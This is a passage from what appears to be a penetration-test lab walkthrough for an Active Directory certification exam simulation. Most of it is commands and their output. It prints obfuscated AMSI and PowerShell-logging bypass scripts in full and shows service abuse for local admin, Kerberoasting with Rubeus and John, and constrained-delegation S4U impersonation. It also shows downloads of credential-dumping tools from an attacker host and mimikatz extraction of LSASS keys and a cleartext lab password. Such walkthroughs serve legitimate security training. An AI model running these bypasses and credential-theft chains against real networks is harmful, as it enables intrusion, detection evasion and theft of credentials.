} | Format-Table SamAccountName, ActiveDirectoryRights
```

`C:/AD/Tools/FindInterestingRightsDCsGPO.ps1`:
```
```
❌

???

![BloodHound Legacy | Node Info: Applocker - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_01.png)

![BloodHound Legacy | Node Info: Applocker - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_01.png)

![BloodHound Legacy | Node Info: DevOps Policy - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_02.png)

![BloodHound Legacy | Node Info: DevOps Policy - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_02.png)

#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter, PowerView)

**Domain Enumeration | Shares**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerHuntShares.psm1`

`type C:\AD\Tools\servers.txt`:
```
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
```
[SNIP]
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][03/11/2025 13:41] Scan Start
 [*][03/11/2025 13:41] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025134124
 [*][03/11/2025 13:41] Importing computer targets from C:\AD\Tools\servers.txt
 [*][03/11/2025 13:41] 3 systems will be targeted
 [*][03/11/2025 13:41] - Skipping ping scan.
 [*][03/11/2025 13:41] Checking if TCP Port 445 is open on 3 computers
 [*][03/11/2025 13:41] - 3 computers have TCP port 445 open.
 [*][03/11/2025 13:41] Getting a list of SMB shares from 3 computers
ComputerName : techsrv30.tech.finance.corp


IpAddress    : 172.16.6.30
ComputerName : dbserver31.tech.finance.corp
IpAddress    : 172.16.6.31
ShareName    : C$
ShareName    : ADMIN$
ShareDesc    : Remote Admin
ShareDesc    : Default share
Sharetype    : 2147483648
ShareAccess  : No

Sharetype    : 2147483648
ShareAccess  : Yes

ComputerName : dbserver31.tech.finance.corp
ComputerName : techsrv30.tech.finance.corp
IpAddress    : 172.16.6.31
ShareName    : C$
IpAddress    : 172.16.6.30
ShareName    : IPC$
ShareDesc    : Remote IPC
ShareDesc    : Default share
Sharetype    : 2147483648
ShareAccess  : No

Sharetype    : 2147483651
ShareAccess  : No
ComputerName : dbserver31.tech.finance.corp
IpAddress    : 172.16.6.31
ShareName    : IPC$

ShareDesc    : Remote IPC
Sharetype    : 2147483651
ShareAccess  : No
```

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
```
[SNIP]

 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY📌
 ---------------------------------------------------------------
 [*][03/11/2025 03:05] Scan Start
 [*][03/11/2025 03:05] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025030549
 [*][03/11/2025 03:05] Importing computer targets from C:\AD\Tools\servers.txt
 [*][03/11/2025 03:05] 4 systems will be targeted
 [*][03/11/2025 03:05] - Skipping ping scan.
 [*][03/11/2025 03:05] Checking if TCP Port 445 is open on 4 computers
 [*][03/11/2025 03:05] - 4 computers have TCP port 445 open.
 [*][03/11/2025 03:05] Getting a list of SMB shares from 4 computers
ComputerName : mgmtsrv.tech.finance.corp
IpAddress    : 172.16.5.156

ShareName    : C$
ComputerName : dbserver31.tech.finance.corp
ShareDesc    : Default share
IpAddress    : 172.16.6.31
Sharetype    : 2147483648
ShareName    : ADMIN$
ShareAccess  : No

ShareDesc    : Remote Admin
Sharetype    : 2147483648
ShareAccess  : No
ComputerName : mgmtsrv.tech.finance.corp

IpAddress    : 172.16.5.156
ComputerName : dbserver31.tech.finance.corp
ShareName    : IPC$
IpAddress    : 172.16.6.31
ShareDesc    : Remote IPC
ShareName    : C$
Sharetype    : 2147483651
ShareDesc    : Default share
ShareAccess  : No
Sharetype    : 2147483648
ShareAccess  : No


ComputerName : dbserver31.tech.finance.corp
No credentials found.
select : Property "OperatingSystem" cannot be found.
At C:\AD\Tools\PowerHuntShares.psm1:2265 char:92
+ ... ComputerName | select OperatingSystem -ExpandProperty OperatingSystem
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (@{ComputerName=studvm.tech.finance.corp}:PSObject) [Select-Object], PSArgumentException
    + FullyQualifiedErrorId : ExpandPropertyNotFound,Microsoft.PowerShell.Commands.SelectObjectCommand
```
❌

`dir C:\AD\Tools\SmbShareHunt-02202025063120`:
```
    Directory: C:\AD\Tools\SmbShareHunt-03112025134124


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/11/2025   1:42 PM                Results
-a----        3/11/2025   1:42 PM         971698 Summary-Report-SmbHunt.html📌
```

**Domain Enumeration | Local Admin Access**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess -Domain tech.finance.corp`:
```
```
❌

**Domain Enumeration | Session Hunting with Invoke-SessionHunter**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`type C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:3.188

HostName     UserSession          Access
--------     -----------          ------
dbserver31🖥️ TECH\sqlserversync👤  False
mgmtsrv🖥️    TECH\techservice👤    False
```

**Domain Enumeration | Session Hunting with PowerView**

???

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`type C:\AD\Tools\sbloggingbypass.txt`:
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

`iex (type C:\AD\Tools\sbloggingbypass.txt)`

`type C:\AD\Tools\amsibypass.txt`:
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

`iex (type C:\AD\Tools\amsibypass.txt)`

`Import-Module C:\AD\Tools\PowerView.ps1`

`Find-DomainUserLocation`:
```
UserDomain      : DCORP-STD422🖥️
UserName        : Administrator👤
ComputerName    : dcorp-std422.dollarcorp.moneycorp.local
IPAddress       : 172.16.100.22
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

---

### Local Privilege Escalation | Feature Abuse (with PowerUp)

2) **Service Abuse for Local Privilege Escalation** (successful ✅)

Description: Identified and exploited a misconfigured Windows service (`vds`) to escalate privileges by modifying its binary path and adding the current user to the Administrators group.

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUp.ps1`

`Invoke-AllChecks`:
```
[SNIP]

ServiceName                     : gupdate📌
Path                            : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem📌
AbuseFunction                   : Install-ServiceBinary -Name 'gupdate'
CanRestart                      : False❌
Name                            : gupdate
Check                           : Modifiable Service Files

[SNIP]

ServiceName   : vds📌
Path          : C:\Windows\System32\vds.exe
StartName     : LocalSystem📌
AbuseFunction : Invoke-ServiceAbuse -Name 'vds'
CanRestart    : True📌
Name          : vds
Check         : Modifiable Services

[SNIP]
```

`Invoke-ServiceAbuse -Name 'vds' -UserName 'tech\studentuser' -Verbose`:
```
VERBOSE: Service 'vds' original path: 'C:\Windows\System32\vds.exe'
VERBOSE: Service 'vds' original state: 'Running'
VERBOSE: Executing command 'net localgroup Administrators tech\studentuser /add'
VERBOSE: binPath for vds successfully set to 'net localgroup Administrators tech\studentuser /add'⏫
VERBOSE: Restoring original path to service 'vds'
VERBOSE: binPath for vds successfully set to 'C:\Windows\System32\vds.exe'
VERBOSE: Restarting 'vds'

ServiceAbused Command
------------- -------
vds           net localgroup Administrators tech\studentuser /add⏫
```

![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner✅

[SNIP]
```
🚩

---

### Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)

3) **Kerberoasting Attack for Domain Privilege Escalation** (unsuccessful ❌)

Description: Enumerated service accounts with Service Principal Names (SPNs) and performed a Kerberoasting attack on `sqlserversync`. Successfully extracted a Kerberos TGS ticket but failed to crack the password using multiple wordlists, indicating a strong password policy.

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -SPN`:
```
[SNIP]

logoncount            : 8
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
objectclass           : {top, person, organizationalPerson, user}
displayname           : sqlserver sync
lastlogontimestamp    : 2/4/2022 5:36:37 AM
userprincipalname     : sqlserversync
samaccountname        : sqlserversync👤
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/6/2022 7:47:34 AM
instancetype          : 4
usncreated            : 26345
objectguid            : 49050a8e-94f9-4ef3-9fdb-fc488cddf552
sn                    : sync
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 2/4/2022 1:16:06 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/4/2022 1:16:06 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname📌: MSSQLSvc📌/dbserver31.tech.finance.corp📌
givenname             : sqlserver
usnchanged            : 37100
lastlogon             : 2/5/2022 11:48:16 PM
badpwdcount           : 0
cn                    : sqlserver sync
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-1325336202-3661212667-302732393-1111
primarygroupid        : 513
pwdlastset            : 2/5/2022 6:16:18 AM
name                  : sqlserver sync

[SNIP]
```

```powershell
$z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r$s$t$u$v$w$x$y$z"
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args $Pwn /user:sqlserversync /simple /rc4opsec /format:john /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
```
[*] Action: Kerberoasting📌

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : sqlserversync👤
[*] Target Domain          : tech.finance.corp
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://tech-dc.tech.finance.corp/DC=tech,DC=finance,DC=corp' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=sqlserversync)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\krb5tgs_hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
```

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`type C:\AD\Tools\krb5tgs_hashes.txt`:
```
$krb5tgs$23$*sqlserversync$tech.finance.corp$MSSQLSvc/dbserver31.tech.finance.corp*$E149345BAB64831EC028269E3F223675$8227DBD5D1EF86C63D7C612E2060BFC72EF3423713033D0BD5C9C7FD24423C892EB59E25B861E0E270726C87819C9CA6267962C1BD84793F8E72820D9C5017475A08

[SNIP]
```

![kali | attacker $>](https://custom-icon-badges.demolab.com/badge/kali-attacker%20[%24>]-e57373?logo=kali-linux_white_32&logoColor=white)

`john --format=krb5tgs --wordlist=./10k-worst-pass.txt ./krb5tgs_hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-03-11 08:42) 0g/s 1000Kp/s 1000Kc/s 1000KC/s fffff1..eyphed
Session completed. 
```
❌

`john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ./krb5tgs_hashes.txt`:
```
```
❌

`john --format=krb5tgs --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt ./krb5tgs_hashes.txt`:
```
```
❌

---

### Domain Privilege Escalation | Constrained Delegation (with PowerView, Rubeus, SafetyKatz)

4) **Constrained Delegation Abuse for Domain Privilege Escalation** (successful ✅)

Description: Performed Active Directory enumeration to identify users or machines with **Constrained Delegation** enabled. The attempt to find a user account with delegation rights was unsuccessful. However, enumeration of **computer accounts** revealed that `STUDVM$` has Constrained Delegation enabled and is allowed to delegate authentication to the **CIFS service on `mgmtsrv.tech.finance.corp`**. This finding is leveraged to impersonate a privileged user and escalate privileges.

- **Find a Delegator User where Constrained Delegation is Enabled**

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -TrustedToAuth`:
```
```
❌

- **Find a Delegator Server where Constrained Delegation is Enabled**

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainComputer -TrustedToAuth`:
```
[SNIP]

pwdlastset                    : 3/11/2025 7:10:31 AM
logoncount                    : 53
badpasswordtime               : 2/4/2022 2:55:13 AM
distinguishedname             : CN=STUDVM,CN=Computers,DC=tech,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/11/2025 6:57:17 AM
whencreated                   : 2/2/2022 7:13:14 AM
samaccountname                : STUDVM$🖥️
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT📌
whenchanged                   : 3/11/2025 2:10:31 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectguid                    : 321b38f3-2d61-4b7d-b3f0-9d8b8c94b266
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto📌    : {CIFS📌/mgmtsrv🖥️.tech.finance.corp, CIFS/mgmtsrv}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/STUDVM, TERMSRV/studvm.tech.finance.corp, WSMAN/studvm, WSMAN/studvm.tech.finance.corp...}
usncreated                    : 12921
usnchanged                    : 65667
lastlogon                     : 3/11/2025 8:52:57 AM
badpwdcount                   : 0
cn                            : STUDVM
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-1325336202-3661212667-302732393-1104
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : STUDVM
dnshostname                   : studvm.tech.finance.corp

[SNIP]
```

- **Extract the Delegator Server AES Encryption Key Hash**

![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : STUDVM$🖥️
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:44 AM
SID               : S-1-5-18

         * Username : studvm$
         * Domain   : TECH.FINANCE.CORP
         * Password : 10 8b c6 de dc 62 e8 c7 98 35 52 d0 87 32 9c c4 35 6e f8 8b e4 33 50 a7 12 68 43 02 13 6a bb 4a 74 e3 b6 2c 1e db ad 93 61 18 17 08 09 89 c1 64 30 fa 85 3b 50 76 2b df 9b 11 d8 20 4f 23 a2 c4 17 db 43 62 54 c2 0b 0e d9 72 b0 de 2e 9f dd e9 96 63 4f 09 12 84 77 f6 0e 6c 13 86 93 54 8c 77 b2 5d ec b3 7a bb 99 3b 2e 06 b9 00 39 44 d4 c7 3b 09 2d 7a 7d 1c 01 26 bf cd 22 45 43 5a 3d b5 58 95 fe f1 4f 38 c6 86 48 eb 44 86 cc bd 43 ce 82 b1 4e 7b a2 fd 09 fb 87 d4 10 f6 47 0e c0 b3 b1 2b 4a f6 e7 32 c4 03 8a fb 58 25 8a 40 46 8e e1 bc f8 8d 0f f8 a3 fa 12 1f 0d c0 58 f8 88 88 53 bf 1e a1 4d 29 de d0 b4 96 87 de 64 02 d4 92 8f c3 e4 36 f3 93 b1 38 2e 68 6f 4b 1d fb 9e 2f 10 9c 72 22 8d a6 5b d8 4d df 7a d6 f1 06 9f 4c
         * Key List :
           aes256_hmac       7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6🔑
           rc4_hmac_nt       e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_old      e5c5fa4934a2a058fb61bf3a143d4050
           rc4_md4           e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_nt_exp   e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_old_exp  e5c5fa4934a2a058fb61bf3a143d4050

[SNIP]
```

- **Forge an S4U TGS using the Delegator Server AES Encryption Key Hash for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**

![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:studvm$ /aes256:7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:http /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: 7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\studvm$'
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'studvm$@TECH.FINANCE.CORP'
[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[*] Sending S4U2self request to 172.16.4.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'studvm$🖥️@TECH.FINANCE.CORP'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'Administrator'🎭 to target SPN 'CIFS📌/mgmtsrv🖥️.tech.finance.corp'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'CIFS/mgmtsrv.tech.finance.corp'
[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[*] Sending S4U2proxy request to domain controller 172.16.4.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'📌
[*] base64(ticket.kirbi) for SPN 'http📌/mgmtsrv🖥️.tech.finance.corp':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Cached Tickets: (1)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/mgmtsrv🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 3/11/2025 9:10:04 (local)
        End Time:   3/11/2025 19:10:04 (local)
        Renew Time: 3/18/2025 9:10:04 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Obtained Ticket to Gain Administrator Access and Remote Control on the Delegatee Server**

`winrs -r:mgmtsrv.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👤
```

`set computername`:
```
COMPUTERNAME=MGMTSRV🖥️
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

5) **Credential Extraction for Domain Lateral Movement** (successful ✅)

Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **cleartext credentials** and **Kerberos keys** of `techservice` and `MGMTSRV$` from **LSASS memory** on `mgmtsrv.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.

![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)

- **Bypassing PowerShell Logging and AMSI for Evasion**

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- **Extract Credentials of `techservice` and `MGMTSRV$` from Memory on `mgmtsrv.tech.finance.corp`**

![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)

![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # token::elevate📌
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

588     {0;000003e7} 1 D 18373          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !📌
 * Process Token : {0;0028e875} 0 D 2685490     TECH\Administrator      S-1-5-21-1325336202-3661212667-302732393-500            (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2701727     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # vault::cred /patch
```
❌

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 93339 (00000000:00016c9b)
Session           : Service from 0
User Name         : techservice👤
Domain            : TECH
Logon Server      : TECH-DC
Logon Time        : 3/11/2025 6:54:59 AM
SID               : S-1-5-21-1325336202-3661212667-302732393-1109

         * Username : techservice
         * Domain   : TECH.FINANCE.CORP
         * Password : Agent for Server1!🔑
         * Key List :
           aes256_hmac       7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb🔑
           aes128_hmac       1e88fc138cbb482e14a836ab47e22816
           rc4_hmac_nt       ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_old      ac25af07540962863d18c6f924ee8ff3
           rc4_md4           ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_nt_exp   ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_old_exp  ac25af07540962863d18c6f924ee8ff3

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MGMTSRV$👤
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:34 AM
SID               : S-1-5-18

         * Username : mgmtsrv$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       e88b558cf0e531fd9cff56c8db3b24ce6784e62e5b2f9cb807b5afa9dfed2fa7🔑
           rc4_hmac_nt       207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_old      207218a0920d00bbbd4daa22f6e767d3
           rc4_md4           207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_nt_exp   207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_old_exp  207218a0920d00bbbd4daa22f6e767d3

[SNIP]
```
🚩

---

